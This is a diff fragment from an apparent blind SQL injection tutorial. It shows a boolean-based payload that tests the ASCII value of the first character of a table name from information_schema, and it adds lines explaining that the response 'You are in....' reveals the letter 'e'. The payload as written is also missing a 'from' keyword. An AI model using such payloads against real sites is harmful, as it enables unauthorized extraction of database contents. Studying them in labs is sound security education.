@@ -305,8 +305,9 @@ Now let us try value 101:
 
 **id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –+**
 
+And we see a message that **You are in....**
 
-
+It means the 1st letter is E for Email.
 
 
 
